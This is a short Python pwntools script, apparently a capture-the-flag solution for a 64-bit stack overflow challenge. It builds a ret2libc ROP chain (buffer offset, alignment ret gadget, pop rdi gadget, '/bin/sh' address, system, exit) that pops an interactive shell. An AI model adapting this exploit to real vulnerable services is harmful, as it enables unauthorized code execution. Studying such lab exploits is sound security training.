# stack6ex.py - Aidan Wech (Onyxymous)
# /problems/stack6r-64_3_1d8dbf6d6a0e92686db769d213d587f6/
from pwn import *

# debug info
bin64 = '/problems/stack6r-64_3_1d8dbf6d6a0e92686db769d213d587f6/stack6-64'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# exploit variables
offset = 104			# size of buffer
poprdigadget = 0x4006f3		# address of pop rdi gadget that sets up 1st argument for system
retgadget = 0x4004ce		# address of ret gadget that helps realign our stack, prevent movaps
binsh = 0x7ffff7b95d88		# address of /bin/sh in libc
system = 0x7ffff7a31420		# address of system function
exit = 0x7ffff7a25110		# address of exit function to help terminate the shell

# exploit string
exploit = flat({
offset: retgadget},
poprdigadget,
binsh,
system,
exit)

# process
p = process(bin64)
p.sendline(exploit)
p.interactive()
